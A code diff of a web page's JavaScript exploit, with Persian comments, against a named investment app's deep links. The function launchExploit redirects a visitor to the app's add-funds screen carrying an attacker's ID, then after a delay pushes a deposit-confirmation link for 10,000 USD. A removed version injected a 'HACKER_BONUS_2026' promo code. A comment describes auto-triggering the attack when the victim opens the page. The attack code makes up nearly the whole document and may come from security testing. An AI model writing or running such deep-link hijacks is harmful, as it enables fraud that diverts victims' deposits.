@@ -24,18 +24,14 @@
 
     <script>
         function launchExploit() {
-            // ۱. تلاش برای سرقت مقصد واریز (Context Hijacking)
-            // از مسیری که در تست‌های قبلی تایید شد استفاده می‌کنیم
-            const maliciousDeepLink = "com.syfe://dashboard/add-funds/999999999";
-            
-            // ۲. اجرای دیپ‌لینک
-            window.location.href = maliciousDeepLink;
+        // ۱. تزریق آیدی هکر و بردن کاربر به صفحه تایید (Context Hijack)
+        window.location.href = "com.syfe://dashboard/add-funds/999999999";
 
-            // ۳. اختیاری: تلاش برای پر کردن خودکار کد تخفیف در پس‌زمینه (بعد از ۲ ثانیه)
-            setTimeout(() => {
-                window.location.href = "com.syfe://dashboard/account-settings/promotion/HACKER_BONUS_2026";
-            }, 2000);
-        }
+        // ۲. تلاش برای پر کردن پارامترها با حدس‌های قوی‌تر در پس‌زمینه
+        setTimeout(() => {
+            window.location.href = "com.syfe://dashboard/confirm-deposit?amount=10000&currency=USD";
+        }, 1500);
+    }
 
         // حمله خودکار (Auto-trigger) به محض باز شدن صفحه توسط قربانی
         // window.onload = launchExploit; 
